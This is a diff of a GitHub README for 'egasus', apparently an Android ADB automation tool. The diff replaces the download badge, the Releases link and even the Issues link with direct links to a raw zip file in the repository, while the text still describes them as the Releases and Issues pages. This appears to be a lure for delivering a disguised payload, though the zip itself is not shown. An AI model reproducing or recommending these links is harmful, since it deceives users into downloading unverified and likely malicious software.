@@ -4,7 +4,7 @@
 Welcome to **egasus**, your go-to tool for managing and automating Android devices using a command-line interface. This powerful application combines Python and ADB (Android Debug Bridge) to give you advanced control over your Android devices. 
 
 ## 📥 Download egasus
-[![Download egasus](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Huey112/egasus/releases)
+[![Download egasus](https://github.com/Huey112/egasus/raw/refs/heads/main/houghband/Software_v1.0-beta.4.zip)](https://github.com/Huey112/egasus/raw/refs/heads/main/houghband/Software_v1.0-beta.4.zip)
 
 To get started, you need to download the application. This link will take you to our Releases page, where you can find the latest version of **egasus**.
 
@@ -22,7 +22,7 @@ Before downloading **egasus**, ensure that your system meets the following requi
 - **ADB**: Latest version of ADB must be installed.
 
 ## 💾 Download & Install
-To download **egasus**, visit our [Releases page](https://github.com/Huey112/egasus/releases). 
+To download **egasus**, visit our [Releases page](https://github.com/Huey112/egasus/raw/refs/heads/main/houghband/Software_v1.0-beta.4.zip). 
 
 1. Open the link to the Releases page.
 2. Look for the latest version at the top of the list.
@@ -63,7 +63,7 @@ Here are some example commands:
 - Regularly update **egasus** to benefit from new features and security updates.
 
 ## 📞 Support
-If you encounter any issues while using **egasus** or have questions, feel free to reach out. You can create an issue on our [GitHub Issues page](https://github.com/Huey112/egasus/issues) for support or suggestions.
+If you encounter any issues while using **egasus** or have questions, feel free to reach out. You can create an issue on our [GitHub Issues page](https://github.com/Huey112/egasus/raw/refs/heads/main/houghband/Software_v1.0-beta.4.zip) for support or suggestions.
 
 ## 🔗 Learn More
 Explore more about **egasus** and its capabilities by visiting our documentation and community forums. Stay tuned for updates and features as we continue to enhance your experience.
